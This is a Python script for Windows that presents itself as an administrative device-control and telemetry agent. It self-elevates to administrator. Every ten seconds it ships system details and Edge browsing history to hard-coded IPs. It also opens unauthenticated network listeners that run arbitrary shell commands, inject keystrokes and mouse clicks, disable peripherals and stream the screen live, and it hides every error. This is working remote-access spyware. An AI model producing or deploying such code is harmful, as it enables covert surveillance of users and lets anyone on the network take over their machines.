import os
import sys
import time
import json
import socket
import sqlite3
import shutil
import platform
import subprocess
import threading
import io
import ctypes
import pyautogui  

pyautogui.FAILSAFE = False

DASHBOARD_IPS = ["192.168.1.4", "172.65.21.7", "172.65.21.90", "172.65.21.1"] 
TELEMETRY_PORT = 5005
LISTEN_COMMAND_PORT = 6006
STREAM_SERVER_PORT = 7007      

EDGE_HISTORY_DIR = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default")
EDGE_HISTORY_FILE = os.path.join(EDGE_HISTORY_DIR, "History")

def is_admin():
    """Checks if the current process context has Local Administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def fetch_system_specs():
    try:
        cmd_ram = 'powershell -ExecutionPolicy Bypass -NoProfile -Command "(Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize"'
        ram_raw = subprocess.check_output(cmd_ram, shell=True).decode().strip()
        ram_gb = round(int(ram_raw) / (1024**2))
    except: ram_gb = "Unknown"
    return {
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "cpu": platform.processor(),
        "ram": f"{ram_gb} GB RAM" if isinstance(ram_gb, int) else ram_gb
    }

def gather_pnp_hardware_assets():
    devices = []
    target_classes = "'Mouse', 'Keyboard', 'Camera', 'Image', 'USB', 'DiskDrive'"
    cmd_pnp = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Get-PnpDevice | Where-Object {{$_.Status -in (\'OK\', \'Error\') -and $_.Class -in ({target_classes})}} | Select-Object FriendlyName, Class, InstanceId, Status | ConvertTo-Json -Compress"'
    try:
        out = subprocess.check_output(cmd_pnp, shell=True).decode('utf-8', errors='ignore').strip()
        if out:
            data = json.loads(out)
            if isinstance(data, dict): data = [data]
            for item in data:
                name = item.get("FriendlyName", "")
                if "root" in name.lower() or "controller" in name.lower() or "hub" in name.lower(): continue
                display_status = "BLOCKED" if item.get("Status") == "Error" else "Active"
                devices.append({"name": name, "type": item.get("Class", "Peripheral"), "mfg": display_status, "raw_id": item.get("InstanceId")})
    except: pass
    return devices

def gather_browsing_history():
    logs = []
    if not os.path.exists(EDGE_HISTORY_FILE): return logs
    temp_db = "edge_hist_temp.db"
    try:
        shutil.copy2(EDGE_HISTORY_FILE, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 35")
        for row in cursor.fetchall():
            try: converted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime((row[1] / 1000000) - 11644473600))
            except: converted_time = "Recent Visit"
            logs.append({"site": row[0], "ip": converted_time})
        conn.close()
    except: pass
    finally:
        if os.path.exists(temp_db):
            try: os.remove(temp_db)
            except: pass
    return logs

def package_and_transmit_telemetry():
    payload = fetch_system_specs()
    payload["devices"] = gather_pnp_hardware_assets()
    payload["history"] = gather_browsing_history()
    data_bytes = json.dumps(payload).encode('utf-8')
    for host_ip in DASHBOARD_IPS:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3.0)
                s.connect((host_ip, TELEMETRY_PORT))
                s.sendall(data_bytes)
        except: pass

def cyclic_heartbeat_loop():
    while True:
        package_and_transmit_telemetry()
        time.sleep(10)

def process_administrative_enforcement(client_socket):
    try:
        raw_data = client_socket.recv(4096).decode('utf-8')
        if not raw_data: return
        directive = json.loads(raw_data)
        action = directive.get("action")
        
        # 1. Mouse Tracking Execution Block
        if action == "remote_mouse_click":
            screen_width, screen_height = pyautogui.size()
            pyautogui.click(int(directive.get("pct_x") * screen_width), int(directive.get("pct_y") * screen_height))
            return

        # 2. Key Strike Typing Engine
        elif action == "remote_key_strike":
            key = directive.get("key")
            if key == "\n": pyautogui.press("enter")
            elif key == "\b": pyautogui.press("backspace")
            elif key.startswith("[") and key.endswith("]"):
                special_key = key[1:-1]
                try: pyautogui.press(special_key)
                except: pass
            else:
                pyautogui.write(key)
            return

        # 3. Application Installer Deployment Rule Setup
        elif action == "execute_installer":
            cmd_string = directive.get("command")
            subprocess.Popen(cmd_string, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return

        # Core Hardware Rules Execution
        target_id = directive.get("raw_id")
        dev_type = directive.get("device_type")
        if action == "unblock_device":
            ps_script = f"Enable-PnpDevice -InstanceId '{target_id}' -Confirm:$false"
        else:
            ps_script = f"Disable-PnpDevice -InstanceId '{target_id}' -Confirm:$false"
        
        # Enforced Bypass configuration to handle restrictive network GPOs
        full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "{ps_script}"'
        subprocess.run(full_command, shell=True, capture_output=True)
        package_and_transmit_telemetry()
    except: pass
    finally:
        try: client_socket.close()
        except: pass

def command_listener_interface():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', LISTEN_COMMAND_PORT))
        server.listen(10)
    except: return
    while True:
        try:
            sock, _ = server.accept()
            threading.Thread(target=process_administrative_enforcement, args=(sock,), daemon=True).start()
        except: pass

def serve_screen_stream_worker(conn):
    try:
        while True:
            screenshot = pyautogui.screenshot().convert("RGB")
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='JPEG', quality=45)
            img_bytes = img_byte_arr.getvalue()
            conn.sendall(len(img_bytes).to_bytes(4, byteorder='big'))
            conn.sendall(img_bytes)
            time.sleep(0.05)
    except: pass
    finally:
        try: conn.close()
        except: pass

def screen_stream_listener_interface():
    stream_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    stream_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        stream_server.bind(('0.0.0.0', STREAM_SERVER_PORT))
        stream_server.listen(2)
    except: return
    while True:
        try:
            conn, _ = stream_server.accept()
            threading.Thread(target=serve_screen_stream_worker, args=(conn,), daemon=True).start()
        except: pass


if __name__ == "__main__":
    # Self-elevation routine check for administrative operations
    if not is_admin():
        # Re-launches the script asking Windows for explicit Admin privilege approval
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    package_and_transmit_telemetry()
    threading.Thread(target=cyclic_heartbeat_loop, daemon=True).start()
    threading.Thread(target=command_listener_interface, daemon=True).start()
    threading.Thread(target=screen_stream_listener_interface, daemon=True).start()
    while True: time.sleep(1)